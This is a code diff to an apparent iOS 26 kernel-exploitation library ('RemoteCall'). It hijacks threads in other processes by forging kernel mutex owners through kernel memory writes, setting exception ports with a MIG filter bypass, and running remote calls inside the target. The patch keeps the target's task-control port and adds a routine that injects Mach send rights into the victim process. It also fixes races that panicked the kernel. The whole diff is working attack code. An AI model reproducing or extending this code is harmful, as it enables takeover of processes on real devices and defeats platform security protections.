@@ -55,6 +55,7 @@ extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t address, 
 #define FAKE_PC_TROJAN                  0x301
 #define FAKE_LR_TROJAN                  0x401
 #define CND_RC_IDENTITY_MESSAGE_ID      2407
+#define CND_RC_SEND_RIGHT_MESSAGE_ID    2408
 /* 23A341 arm64e shared-cache addresses: _getpid=0x22b0d8138 and a
  * deterministic `brk #1` instruction=0x22b0d6440.  The relative offset is
  * slide-independent and is validated against the local mapping before use. */
@@ -83,6 +84,12 @@ typedef struct {
     mach_msg_type_number_t new_stateCnt;
     natural_t new_state[1296];
 } __attribute__((packed, aligned(4))) CNDRemoteCallIdentityReply;
+
+typedef struct {
+    mach_msg_header_t head;
+    mach_msg_body_t body;
+    mach_msg_port_descriptor_t right;
+} CNDRemoteCallSendRightMessage;
 
 // from https://github.com/nickingravallo/Machium/blob/main/Machium/Breakpoint.h
 #define BREAKPOINT_ENABLE 481
@@ -167,6 +174,7 @@ typedef struct RemoteCallState {
     bool identityInitialConversionSucceeded;
     bool identityInitialReplySucceeded;
     mach_port_t identityThreadPort;
+    mach_port_t identityTaskPort;
     uint64_t identityThreadAddr;
     uint64_t identityTrapAddress;
     uint64_t identityConversionCount;
@@ -226,6 +234,15 @@ static void remote_call_pop_state(RemoteCallState *previous)
 #define g_RC_dummyThreadTro        (remote_call_current_state()->dummyThreadTro)
 #define g_RC_selfThreadAddr        (remote_call_current_state()->selfThreadAddr)
 #define g_RC_selfThreadCtid        (remote_call_current_state()->selfThreadCtid)
+
+/* xnu-12377 (iOS 26.0 23A341) osfmk/kern/lock_mtx.h: the 32-bit lck_mtx.data
+ * word stores the owner ctid in the low 28 bits and LCK_MTX_NEEDS_WAKEUP in
+ * bit 30.  There is no separate LOCKED bit: owner == 0 means free, and every
+ * acquire path requires owner == 0.  lck_mtx_unlock's slow path panics
+ * ("Mutex ... is unexpectedly not owned by thread ...", lock_mtx.c) when the
+ * unlocking thread's ctid does not match the stored owner. */
+#define CND_LCK_MTX_CTID_MASK      0x0fffffffU
+#define CND_LCK_MTX_NEEDS_WAKEUP   0x40000000U
 #define g_RC_originalState         (remote_call_current_state()->originalState)
 #define g_RC_capturedOriginalStates (remote_call_current_state()->capturedOriginalStates)
 #define g_RC_capturedOriginalStateCount (remote_call_current_state()->capturedOriginalStateCount)
@@ -257,6 +274,7 @@ static void remote_call_pop_state(RemoteCallState *previous)
 #define g_RC_identityInitialConversionSucceeded (remote_call_current_state()->identityInitialConversionSucceeded)
 #define g_RC_identityInitialReplySucceeded (remote_call_current_state()->identityInitialReplySucceeded)
 #define g_RC_identityThreadPort     (remote_call_current_state()->identityThreadPort)
+#define g_RC_identityTaskPort       (remote_call_current_state()->identityTaskPort)
 #define g_RC_identityThreadAddr     (remote_call_current_state()->identityThreadAddr)
 #define g_RC_identityTrapAddress   (remote_call_current_state()->identityTrapAddress)
 #define g_RC_identityConversionCount (remote_call_current_state()->identityConversionCount)
@@ -579,12 +597,16 @@ static kern_return_t remote_call_reply_identity(
         MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
 }
 
-static void remote_call_release_identity_thread_right(void)
+static void remote_call_release_identity_rights(void)
 {
     if (MACH_PORT_VALID(g_RC_identityThreadPort)) {
         mach_port_deallocate(mach_task_self_, g_RC_identityThreadPort);
     }
     g_RC_identityThreadPort = MACH_PORT_NULL;
+    if (MACH_PORT_VALID(g_RC_identityTaskPort)) {
+        mach_port_deallocate(mach_task_self_, g_RC_identityTaskPort);
+    }
+    g_RC_identityTaskPort = MACH_PORT_NULL;
 }
 
 static void remote_call_release_identity_request_rights(
@@ -715,6 +737,24 @@ static uint64_t remote_call_resolve_identity_trap_address(void)
     return trapAddress;
 }
 
+/* Release the forged dummy-thread mutex owner, but only while the word
+ * still names us.  Every lck_mtx acquire path requires owner == 0, so while
+ * the stored owner is still our ctid the helper cannot have taken the lock
+ * and this write cannot land inside its critical section.  If the helper
+ * already owns the mutex, its own lck_mtx_unlock restores owner == 0 with
+ * proper wakeup handling; clobbering the word there would make that unlock
+ * see owner 0 and panic at lock_mtx.c ("unexpectedly not owned by thread"). */
+static void release_forged_dummy_mutex(const char *why)
+{
+    uint32_t mtx = thread_get_mutex(g_RC_dummyThreadAddr);
+    if ((mtx & CND_LCK_MTX_CTID_MASK) == g_RC_selfThreadCtid) {
+        thread_set_mutex(g_RC_dummyThreadAddr, CND_LCK_MTX_NEEDS_WAKEUP);
+    } else {
+        RC_DEBUG("[%s] dummy mutex %#x no longer forged to ctid %#x; "
+                 "skipping release\n", why, mtx, g_RC_selfThreadCtid);
+    }
+}
+
 bool set_exception_port_on_thread(mach_port_t exceptionPort,
                                   uint64_t currThread,
                                   bool useMigFilterBypass,
@@ -814,10 +854,31 @@ bool set_exception_port_on_thread(mach_port_t exceptionPort,
     if(useMigFilterBypass)
         usleep(100000);
     
+    /* Forge the dummy thread's mutex owner to ourselves only while the lock
+     * is actually free.  The helper parks in lck_mtx_lock on this word, so it
+     * must read as "owned by us" before the helper is resumed; writing over a
+     * word the helper already owns would make its lck_mtx_unlock take the
+     * slow path and panic (lock_mtx.c: "unexpectedly not owned by thread"). */
+    uint32_t dummyMutexBefore = thread_get_mutex(g_RC_dummyThreadAddr);
+    if ((dummyMutexBefore & CND_LCK_MTX_CTID_MASK) != 0) {
+        printf("[%s:%d] dummy mutex %#x not free before forge; aborting helper setup\n",
+               __FUNCTION__, __LINE__, dummyMutexBefore);
+        /* A stale forge owned by this thread can be released safely.  Any
+         * other owner must be left untouched; in both cases, do not resume a
+         * helper against an ownership state this invocation did not create. */
+        release_forged_dummy_mutex("pre-forge mutex not free");
+        pthread_cancel(pthread);
+        mach_port_deallocate(mach_task_self_, machThread);
+        return false;
+    }
     thread_set_mutex(g_RC_dummyThreadAddr, g_RC_selfThreadCtid);
-    
+
     if (!thread_resume_wrapper(machThread))
     {
+        /* The helper never ran, so the forged owner is still ours; release it
+         * or a later thread_mtx_lock(dummy) from this thread would trip the
+         * recursive-owner panic (__lck_mtx_owned_panic). */
+        release_forged_dummy_mutex("helper resume failed");
         pthread_cancel(pthread);
         mach_port_deallocate(mach_task_self_, machThread);
         return false;
@@ -915,8 +976,12 @@ bool set_exception_port_on_thread(mach_port_t exceptionPort,
         }
     }
     
-    thread_set_mutex(g_RC_dummyThreadAddr, 0x40000000);
-    
+    /* Release the forged owner only if the helper has not taken the lock
+     * yet; see release_forged_dummy_mutex.  Unconditionally rewriting the
+     * word here raced with the helper's lck_mtx_unlock and panicked the
+     * kernel whenever the helper had already acquired the mutex. */
+    release_forged_dummy_mutex("helper finished");
+
     thread_set_exception_ports(g_RC_dummyThreadMach, 0, exceptionPort,
                                behavior, ARM_THREAD_STATE64);
 
@@ -1596,7 +1661,7 @@ static void abandon_remote_call_internal(void) {
     if (MACH_PORT_VALID(g_RC_dummyThreadMach)) {
         mach_port_deallocate(mach_task_self_, g_RC_dummyThreadMach);
     }
-    remote_call_release_identity_thread_right();
+    remote_call_release_identity_rights();
     clear_remote_shmem_cache();
     (void)reap_dead_port_names("abandon_remote_call");
     g_RC_taskAddr = 0;
@@ -1695,7 +1760,7 @@ static int destroy_remote_call_internal(void) {
     if (MACH_PORT_VALID(g_RC_dummyThreadMach)) {
         mach_port_deallocate(mach_task_self_, g_RC_dummyThreadMach);
     }
-    remote_call_release_identity_thread_right();
+    remote_call_release_identity_rights();
     clear_remote_shmem_cache();
     (void)reap_dead_port_names("destroy_remote_call");
     g_RC_taskAddr = 0;
@@ -1741,6 +1806,7 @@ bool remote_call_has_local_state(void) {
            g_RC_dummyThreadAddr ||
            g_RC_dummyThreadTro ||
            MACH_PORT_VALID(g_RC_identityThreadPort) ||
+           MACH_PORT_VALID(g_RC_identityTaskPort) ||
            g_RC_vmMap ||
            g_RC_callThreadAddr ||
            g_RC_trojanThreadAddr ||
@@ -1845,6 +1911,178 @@ size_t remote_call_copy_original_thread_states(
     }
     pthread_mutex_unlock(&g_universal_ipc_mutex);
     return count;
+}
+
+bool remote_call_transfer_send_right_to_target(
+    mach_port_t localRight,
+    mach_port_name_t *targetNameOut,
+    RemoteCallSendRightTransferReport *reportOut)
+{
+    RemoteCallSendRightTransferReport report = {0};
+    report.mailboxAllocateResult = KERN_FAILURE;
+    report.mailboxExtractResult = KERN_FAILURE;
+    report.messageSendResult = (mach_msg_return_t)KERN_FAILURE;
+    report.messageReceiveResult = (mach_msg_return_t)KERN_FAILURE;
+    report.mailboxCleanupResult = KERN_FAILURE;
+    snprintf(report.failureStage, sizeof(report.failureStage), "%s",
+             "preflight");
+    if (targetNameOut) *targetNameOut = MACH_PORT_NULL;
+
+    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
+    pthread_mutex_lock(&g_universal_ipc_mutex);
+
+    report.taskRightAvailable = !remote_call_uses_lab_backend() &&
+        g_RC_identityTaskRightExact &&
+        MACH_PORT_VALID(g_RC_identityTaskPort) &&
+        g_RC_pid > 0 && g_RC_taskAddr != 0;
+    if (!targetNameOut || !MACH_PORT_VALID(localRight) ||
+        !report.taskRightAvailable || !g_RC_success) {
+        goto out;
+    }
+
+    mach_port_name_t targetMailbox = MACH_PORT_NULL;
+    mach_port_t localMailboxSend = MACH_PORT_NULL;
+    mach_msg_type_name_t extractedType = 0;
+    uint64_t remoteMessage = 0;
+    bool messageReceived = false;
+
+    report.mailboxAllocateResult = mach_port_allocate(
+        g_RC_identityTaskPort, MACH_PORT_RIGHT_RECEIVE, &targetMailbox);
+    if (report.mailboxAllocateResult != KERN_SUCCESS ||
+        !MACH_PORT_VALID(targetMailbox)) {
+        snprintf(report.failureStage, sizeof(report.failureStage), "%s",
+                 "mailbox-allocate");
+        goto cleanup;
+    }
+
+    report.mailboxExtractResult = mach_port_extract_right(
+        g_RC_identityTaskPort, targetMailbox, MACH_MSG_TYPE_MAKE_SEND,
+        &localMailboxSend, &extractedType);
+    if (report.mailboxExtractResult != KERN_SUCCESS ||
+        !MACH_PORT_VALID(localMailboxSend) ||
+        extractedType != MACH_MSG_TYPE_PORT_SEND) {
+        snprintf(report.failureStage, sizeof(report.failureStage), "%s",
+                 "mailbox-extract");
+        goto cleanup;
+    }
+
+    remoteMessage = do_remote_call_stable_internal(
+        1000, "mmap", 0, PAGE_SIZE, VM_PROT_READ | VM_PROT_WRITE,
+        MAP_PRIVATE | MAP_ANON, (uint64_t)-1, 0, 0, 0);
+    if (!remoteMessage || remoteMessage == UINT64_MAX || !g_RC_success) {
+        snprintf(report.failureStage, sizeof(report.failureStage), "%s",
+                 "message-buffer");
+        goto cleanup;
+    }
+
+    CNDRemoteCallSendRightMessage message = {0};
+    message.head.msgh_bits = MACH_MSGH_BITS_COMPLEX |
+        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+    message.head.msgh_size = (mach_msg_size_t)sizeof(message);
+    message.head.msgh_remote_port = localMailboxSend;
+    message.head.msgh_id = CND_RC_SEND_RIGHT_MESSAGE_ID;
+    message.body.msgh_descriptor_count = 1;
+    message.right.name = localRight;
+    message.right.disposition = MACH_MSG_TYPE_COPY_SEND;
+    message.right.type = MACH_MSG_PORT_DESCRIPTOR;
+    report.messageSendResult = mach_msg(
+        &message.head, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+        message.head.msgh_size, 0, MACH_PORT_NULL, 1000,
+        MACH_PORT_NULL);
+    if (report.messageSendResult != MACH_MSG_SUCCESS) {
+        snprintf(report.failureStage, sizeof(report.failureStage), "%s",
+                 "message-send");
+        goto cleanup;
+    }
+
+    report.messageReceiveResult = (mach_msg_return_t)
+        do_remote_call_stable_internal(
+            1000, "mach_msg", remoteMessage,
+            MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, PAGE_SIZE,
+            targetMailbox, 1000, MACH_PORT_NULL, 0);
+    messageReceived = report.messageReceiveResult == MACH_MSG_SUCCESS &&
+        g_RC_success;
+    if (!messageReceived) {
+        snprintf(report.failureStage, sizeof(report.failureStage), "%s",
+                 "message-receive");
+        goto cleanup;
+    }
+
+    CNDRemoteCallSendRightMessage received = {0};
+    if (!remote_read_internal(remoteMessage, &received, sizeof(received))) {
+        g_RC_ioFailures++;
+        snprintf(report.failureStage, sizeof(report.failureStage), "%s",
+                 "message-readback");
+        goto cleanup;
+    }
+    report.descriptorValidated =
+        received.head.msgh_id == CND_RC_SEND_RIGHT_MESSAGE_ID &&
+        received.head.msgh_size >= sizeof(received) &&
+        (received.head.msgh_bits & MACH_MSGH_BITS_COMPLEX) != 0 &&
+        received.body.msgh_descriptor_count == 1 &&
+        received.right.type == MACH_MSG_PORT_DESCRIPTOR &&
+        (received.right.disposition == MACH_MSG_TYPE_PORT_SEND ||
+         received.right.disposition == MACH_MSG_TYPE_COPY_SEND) &&
+        MACH_PORT_VALID(received.right.name);
+    if (!report.descriptorValidated) {
+        snprintf(report.failureStage, sizeof(report.failureStage), "%s",
+                 "descriptor-validation");
+        goto cleanup;
+    }
+
+    report.targetName = received.right.name;
+    *targetNameOut = report.targetName;
+    report.failureStage[0] = '\0';
+
+cleanup:
+    if (messageReceived && !report.descriptorValidated && remoteMessage &&
+        g_RC_success) {
+        /* A received descriptor already owns a target-space send right.
+         * Destroy malformed/unreadable messages before releasing storage so
+         * a failed handoff cannot leak that right into the service. */
+        (void)do_remote_call_stable_internal(
+            1000, "mach_msg_destroy", remoteMessage,
+            0, 0, 0, 0, 0, 0, 0);
+    }
+    if (remoteMessage && remoteMessage != UINT64_MAX && g_RC_success) {
+        (void)do_remote_call_stable_internal(
+            1000, "munmap", remoteMessage, PAGE_SIZE,
+            0, 0, 0, 0, 0, 0);
+    }
+    if (MACH_PORT_VALID(localMailboxSend)) {
+        mach_port_deallocate(mach_task_self_, localMailboxSend);
+    }
+    if (MACH_PORT_VALID(targetMailbox)) {
+        report.mailboxCleanupResult = mach_port_mod_refs(
+            g_RC_identityTaskPort, targetMailbox,
+            MACH_PORT_RIGHT_RECEIVE, -1);
+    }
+    if (report.descriptorValidated &&
+        report.mailboxCleanupResult != KERN_SUCCESS) {
+        snprintf(report.failureStage, sizeof(report.failureStage), "%s",
+                 "mailbox-cleanup");
+    }
+
+out:
+    if (reportOut) *reportOut = report;
+    pthread_mutex_unlock(&g_universal_ipc_mutex);
+    return report.descriptorValidated &&
+        MACH_PORT_VALID(report.targetName) &&
+        report.mailboxCleanupResult == KERN_SUCCESS;
+}
+
+kern_return_t remote_call_deallocate_target_send_right(
+    mach_port_name_t targetName)
+{
+    if (!MACH_PORT_VALID(targetName)) return KERN_INVALID_NAME;
+    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
+    pthread_mutex_lock(&g_universal_ipc_mutex);
+    kern_return_t result = g_RC_identityTaskRightExact &&
+        MACH_PORT_VALID(g_RC_identityTaskPort)
+        ? mach_port_deallocate(g_RC_identityTaskPort, targetName)
+        : KERN_INVALID_TASK;
+    pthread_mutex_unlock(&g_universal_ipc_mutex);
+    return result;
 }
 
 void remote_call_clear_shmem_cache_public(const char *reason)
@@ -2611,6 +2849,12 @@ static int init_remote_call_configured(const char* process,
         g_RC_identityThreadAddr = deliveredThread;
         g_RC_identityThreadPort = identityRequest.thread.name;
         identityRequest.thread.name = MACH_PORT_NULL;
+        /* Retain the kernel-minted task-control send right only for this
+         * RemoteCall session.  Bounded port-descriptor handoffs use it to
+         * create a temporary target mailbox; teardown releases it alongside
+         * the retained thread right on every normal and abandon path. */
+        g_RC_identityTaskPort = identityRequest.task.name;
+        identityRequest.task.name = MACH_PORT_NULL;
         remote_call_release_identity_request_rights(&identityRequest, true);
         g_RC_identityTrapAddress =
             remote_call_resolve_identity_trap_address();
@@ -2619,7 +2863,7 @@ static int init_remote_call_configured(const char* process,
                    "executable trap address\n");
             (void)remote_call_reply_identity(
                 &identityRequest, &exc.threadState);
-            remote_call_release_identity_thread_right();
+            remote_call_release_identity_rights();
             remote_call_note_init_failure(
                 RemoteCallInitFailureOther, targetPid);
             abandon_remote_call();
@@ -2627,10 +2871,11 @@ static int init_remote_call_configured(const char* process,
         }
         g_RC_identityHandlerRetained = true;
         printf("[RemoteCall] identity bootstrap bound exact target "
-               "thread=%#llx port=0x%x task=%#llx trap=%#llx; future exceptions use "
+               "thread=%#llx port=0x%x task=%#llx task-port=0x%x trap=%#llx; future exceptions use "
                "validated identity delivery.\n",
                g_RC_identityThreadAddr, g_RC_identityThreadPort,
-               g_RC_taskAddr, g_RC_identityTrapAddress);
+               g_RC_taskAddr, g_RC_identityTaskPort,
+               g_RC_identityTrapAddress);
     }
     
     printf("[RemoteCall] Thread trapped — hijacking execution inside %s.\n", process);
@@ -2720,7 +2965,7 @@ static int init_remote_call_configured(const char* process,
         }
         remote_call_release_identity_request_rights(
             &identityRequest, false);
-        remote_call_release_identity_thread_right();
+        remote_call_release_identity_rights();
         remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
         abandon_remote_call();
         return -1;
